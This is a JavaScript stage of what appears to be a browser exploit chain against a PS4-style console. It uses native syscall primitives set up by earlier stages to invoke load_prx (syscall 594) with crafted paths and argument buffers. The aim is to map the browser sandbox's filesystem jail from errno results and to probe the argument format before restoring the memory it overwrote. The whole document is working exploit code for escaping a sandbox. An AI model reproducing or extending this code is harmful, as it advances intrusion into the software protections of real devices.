// 594 filesystem-jail oracle + args-format fix. realnull in the
// disambig run reached path resolution (ENOENT on /system/common/lib/
// libSceFios2.prx). Part A: path prefixes through the same NULL-args
// shape to map the browser jail (ENOENT vs EACCES/EPERM vs EISDIR vs
// 0). Part B: the PS4 load_prx args convention (first u32 = args size,
// then data) against the real path — if EINVAL was an args-format
// fault, the size-header form should advance (ENOENT/EPERM/0).
// Guards + restore + PID. Markers 4 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys594 !== "number")
    throw new Error("chain_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var nameOff = 0x200;
  var argOff = 0x300, argLen = 0x40;
  var statusOff = 0x400, statusLen = 0x100;
  var regionEnd = statusOff + statusLen;
  if (regionEnd > frame.length)
    throw new Error("frame_region_too_small");
  var nameAddress = address + nameOff;
  var argAddress = address + argOff;
  var statusAddress = address + statusOff;
  var original = Array.from(frame.subarray(nameOff, regionEnd));
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function putName(text) {
    for (var i = 0; i < text.length; i++)
      frame[nameOff + i] = text.charCodeAt(i);
    frame[nameOff + text.length] = 0;
    for (var z = text.length + 1; z < 200; z++) frame[nameOff + z] = 0;
  }
  function attempt(text, argsStyle) {
    putName(text);
    frame.fill(0, statusOff, statusOff + statusLen);
    var call;
    if (argsStyle === "null") {
      call = native.call("sys594", [nameAddress, 0, 0, 0, 0,
        statusAddress]);
    } else {
      // PS4 convention: first u32 = args size, then data
      frame[argOff] = 0x20; frame[argOff + 1] = 0;
      frame[argOff + 2] = 0; frame[argOff + 3] = 0;
      for (var i = 4; i < argLen; i++) frame[argOff + i] = 0;
      call = native.call("sys594", [nameAddress, argAddress, 0x20,
        0, 0, statusAddress]);
    }
    var errno = (call.value === -1) ? native.readErrno() : null;
    var st = "";
    for (var d = 0; d < 8; d++)
      st += ("0" + frame[statusOff + d].toString(16)).slice(-2);
    return call.value + "/" + (errno === null ? "ok" : errno) +
      "st" + st;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("lpj_preflight");
  var paths = ["/system/common/lib/libSceFios2.prx",
    "/system/common/lib/", "/system/", "/app0/",
    "/data/", "/update/", "/mnt/", "/"];
  var lines = [];
  for (var p = 0; p < paths.length; p++) {
    phase = "path_" + p;
    lines.push(paths[p] + " => " + attempt(paths[p], "null"));
  }
  mark("lpj_paths_done");
  phase = "args_style";
  lines.push("fios_sizehdr:" + attempt(
    "/system/common/lib/libSceFios2.prx", "size"));
  mark("lpj_args_done");
  for (var r = 0; r < original.length; r++)
    frame[nameOff + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[nameOff + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  mark("lpj_done");
  result = { id: "loadprx_jail_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { lines: lines.join(" | ").slice(0, 480),
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "loadprx_jail_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
